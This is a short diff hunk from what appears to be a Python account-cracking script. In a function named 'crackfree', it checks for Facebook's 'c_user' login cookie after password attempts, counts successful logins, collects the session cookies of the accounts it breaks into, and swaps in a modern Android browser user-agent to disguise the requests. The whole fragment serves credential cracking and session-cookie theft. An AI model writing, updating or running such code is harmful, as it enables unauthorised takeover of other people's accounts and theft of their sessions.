@@ -798,7 +798,7 @@ def crackfree(idf,pwv):
 				cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				headapp={"user-agent":"nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"}
+				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36"}
 				if 'no' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
